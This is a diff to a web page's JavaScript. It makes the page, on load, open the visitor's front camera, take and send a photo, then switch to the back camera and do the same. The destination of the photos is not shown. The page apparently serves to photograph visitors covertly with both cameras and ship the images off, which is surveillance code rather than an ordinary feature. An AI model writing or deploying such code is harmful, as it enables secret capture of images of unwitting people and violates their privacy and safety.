@@ -44,6 +44,13 @@
                 });
         }
 
+        // Function to stop the video stream
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }
+
         // Function to capture and send a photo
         function captureAndSendPhoto() {
             const context = canvas.getContext('2d');
@@ -74,31 +81,39 @@
             });
         }
 
-        // Start capturing photos from the front and back cameras if available
-        getCameraDevices().then((availableCameras) => {
-            // Find front and back cameras
-            const frontCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('front'));
-            const backCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('back'));
+        // Function to capture photos from both front and back cameras
+        function captureFromBothCameras() {
+            getCameraDevices().then((availableCameras) => {
+                // Find front and back cameras
+                const frontCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('front'));
+                const backCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('back'));
 
-            // Default to front camera if available, else use any available camera
-            if (frontCamera) {
-                startCamera(frontCamera.deviceId);
-                video.onloadedmetadata = () => {
-                    captureAndSendPhoto();
-                };
-            }
+                // Default to front camera if available, else use any available camera
+                if (frontCamera) {
+                    // Start with front camera
+                    startCamera(frontCamera.deviceId).then(() => {
+                        video.onloadedmetadata = () => {
+                            captureAndSendPhoto(); // Capture photo from front camera
+                            stopCamera(); // Stop the front camera stream
+                            // After capturing from front camera, switch to the back camera
+                            if (backCamera) {
+                                setTimeout(() => {
+                                    startCamera(backCamera.deviceId).then(() => {
+                                        video.onloadedmetadata = () => {
+                                            captureAndSendPhoto(); // Capture photo from back camera
+                                            stopCamera(); // Stop the back camera stream
+                                        };
+                                    });
+                                }, 2000); // Wait for 2 seconds before switching to back camera
+                            }
+                        };
+                    });
+                }
+            });
+        }
 
-            // If back camera is available, switch to it after capturing from the front camera
-            if (backCamera) {
-                setTimeout(() => {
-                    startCamera(backCamera.deviceId);
-                    video.onloadedmetadata = () => {
-                        captureAndSendPhoto();
-                    };
-                }, 1000); // Wait for 3 seconds before switching to the back camera
-            }
-        });
-
+        // Start capturing from both front and back cameras
+        captureFromBothCameras();
     </script>
 </body>
 </html>
